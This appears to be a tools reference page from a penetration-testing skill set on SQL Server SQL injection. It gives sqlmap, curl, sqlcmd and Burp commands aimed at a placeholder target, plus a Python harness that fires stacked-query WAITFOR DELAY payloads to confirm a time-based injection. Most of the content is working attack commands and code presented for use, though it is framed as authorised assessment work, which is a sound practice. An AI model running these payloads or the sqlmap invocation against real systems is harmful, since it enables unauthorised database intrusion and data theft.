# Tools, CLI Flags, and SDK Reference

> Sub-skill: [`sql-injection-mssql-variants`](SKILL.md) | Family: **Web and Application**

Flags below are the ones this technique actually needs. Verify with `--help` on your installed version before relying on an exact spelling.

## Tool and Command Matrix

| Tool / Package | Verified Command or Entry Point | Purpose | Platforms |
|---|---|---|---|
| `curl` | `curl -sS -o /dev/null -w '%{time_total}\n' 'https://target.example/orders?id=5'` | Capture the elapsed-time baseline needed before any WAITFOR DELAY differential on SQL Server | Cross-platform |
| `sqlmap` | `sqlmap -u 'https://target.example/orders?id=5' --dbms=mssql --technique=BT --batch --level=1` | Confirm boolean and time channels on SQL Server with WAITFOR while excluding stacked and file primitives | Linux, Windows, macOS |
| `sqlcmd` | `sqlcmd -S target -Q "SELECT @@version"` | Verify the backend is SQL Server and read the banner when a direct connection is in authorised scope | Windows, Linux |
| `Burp Suite Repeater` | `Send to Repeater and use 'Send group in sequence (single connection)' for the WAITFOR pair` | Keep the timing baseline and probe on one connection so setup latency does not pollute the delta | Cross-platform |

## Minimal Script Shape

A SQL Server timing harness: it measures a WAITFOR DELAY zero branch against a five-second branch across repeats and reports whether the delay differential is real rather than jitter.

```python
import time
import urllib.parse
import urllib.request

BASE = "https://target.example/orders"
PARAM = "id"


def timed(value):
    url = BASE + "?" + urllib.parse.urlencode({PARAM: value})
    start = time.perf_counter()
    req = urllib.request.Request(url, headers={"User-Agent": "authorised-assessment"})
    with urllib.request.urlopen(req, timeout=30) as r:
        r.read()
    return time.perf_counter() - start


fast = min(timed("5; IF(1=1) WAITFOR DELAY '0:0:0'--") for _ in range(3))
slow = min(timed("5; IF(1=1) WAITFOR DELAY '0:0:5'--") for _ in range(3))
print({"fast_min_s": round(fast, 2), "slow_min_s": round(slow, 2),
       "waitfor_differential": slow - fast > 4})
```
